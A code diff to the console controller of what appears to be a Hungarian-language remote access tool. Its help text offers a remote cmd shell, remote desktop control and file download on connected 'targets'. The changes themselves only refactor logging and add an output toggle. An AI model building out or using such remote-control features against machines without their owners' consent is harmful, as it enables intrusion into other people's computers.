@@ -100,7 +100,7 @@ rShello      - távolról vezérelhető cmd-t nyit               [$célpont spec
 mouseC       - távolról vezérelhető desktop applikáció       [$célpont specifikus!$]
              - először telepítés : ÷exet ""MCL.exe""÷";
 
-                    Log(helpuzenet, ConsoleColor.Yellow);
+                    Log(helpuzenet, true, ConsoleColor.Yellow);
                     break;
 
                 case "target":
@@ -221,15 +221,19 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                         break;
                     }
                     Console.ForegroundColor = ConsoleColor.Gray;
-                    Console.WriteLine("Csatlakozott kliensek:");
-                    LogTxt("Csatlakozott kliensek:");
-                    Console.WriteLine("---------------------");
+
+                    Log("Csatlakozott kliensek:");
+                    //Console.WriteLine("Csatlakozott kliensek:");
+                    //LogTxt("Csatlakozott kliensek:");
+                    //Console.WriteLine("---------------------");
+                    Log("---------------------");
                     foreach (var item in kliensek)
                     {
                         Log($"[|{item.Client.RemoteEndPoint}|]");
                     }
-                    Console.ForegroundColor = ConsoleColor.Gray;
-                    Console.WriteLine("---------------------");
+                    //Console.ForegroundColor = ConsoleColor.Gray;
+                    //Console.WriteLine("---------------------");
+                    Log("---------------------");
                     break;
 
                 case "mousex":
@@ -323,7 +327,7 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                 case "download":
                     if (!CheckTargetEnabled()) break;
                     Send("download");
-                    MessageBox.Show(bemenet);
+                    //MessageBox.Show(bemenet);
                     Send(bemenet);
                     break;
                 case "cdme":
@@ -770,6 +774,34 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
 
                     Directory.SetCurrentDirectory(localExePath);
 
+                    break;
+
+
+                case "output":
+                    if (string.IsNullOrEmpty(bemenet))
+                    {
+                        if (output)
+                        {
+                            Log($"output : {output}");
+                        } else
+                        {
+                            Console.WriteLine($"output : {output}");
+                        }
+                    }
+                    else
+                    {
+                        switch (bemenet.Split(' ')[0])
+                        {
+                            case "true":
+                                output = true;
+                                break;
+                            case "false":
+                                output = false;
+                                break;
+                            default:
+                                break;
+                        }
+                    }
                     break;
 
 
